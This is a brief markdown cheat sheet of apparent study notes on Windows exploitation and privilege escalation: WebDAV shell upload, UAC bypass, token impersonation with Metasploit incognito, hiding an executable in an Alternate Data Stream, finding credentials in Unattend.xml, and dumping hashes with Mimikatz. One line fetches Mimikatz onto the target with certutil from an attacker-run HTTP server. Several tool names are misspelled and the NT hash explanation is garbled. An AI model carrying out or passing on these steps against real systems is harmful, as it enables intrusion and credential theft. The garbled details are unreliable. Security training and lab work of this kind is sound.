## Frequently Exploited Services
```
Microsoft IIS (internet information services)
WebDAV (WebBased Distributed Authoring and versioning)
RDP (Remote Desktop Protocol)
WinRM (Remote Management)
```

## MicrosoftIIS + WebDAV Exploiting
```
Enumerate using -----     davtest
Upload shell and Exploit using  ------ cadaver
```

## MSFConsole
```
multi/recon/local_exploit_suggester
```
## Kernal Exploits

```
exploit suggester python script --database --systeminfo
```

## Window Privesc
### UACME
```
UAC Bypassing UACME
```
### Access Token Impersonation ( Noted: Access Token are created and managed by "LSASS Local Security Authority SubSystem Service" then attached to userinit.exe)

#### Privilege Required For Impersonation
```
SeAssignPrimaryToken:
SeCreateToken:
SeImpersonatePrivilege:
```
#### Incoginto in Metasploit
```
load incognito
list_tokens -u
impersonate_token "--token---"
```
### Alternate Data Streams ( To hide malicious payload inside the legitimate files' metadata )
```
first create a txt file : "notepad lee.txt"
type "file to hide" > lee.txt:somthing.exe
mklink aname.exe C:\path\to\lee.txt:something.exe
.\aname.exe
```
### Dumping Password Hashes
#### NT NTLM hashes 
```
NT --> Split into seven chunk of character, uppercase them all, DES Algorithm
NTLM --> Case-sensitive, use MD4 algorithms
```

#### Search Password in Window Config files
##### Unattened Window Setup Utility
```
C:\\Windows\Panther\Unattend.xml
C:\\Windows\Panther\Autounattend.xml
```
### Dumping Password Hash with Mimitkaz 
#### Kiwi extension
```
load kiwi (in meterpreter shell)
? for help
```
#### Mimitkaz 
```
upload mimitkaz (from meterpreter) or
python3 -m http.server(Attacker), cerutil -urlcache -split -f http://file/to/download.extension C:\\mimitkatz
```
##### Mimitkaz commands
```
privilege::debug
lsadump::sam
lsadump::secrets
sekurlsa::loggedonpasswords  (Dump loggedon password in plain text)

```
#### Pass the Hashes
easy























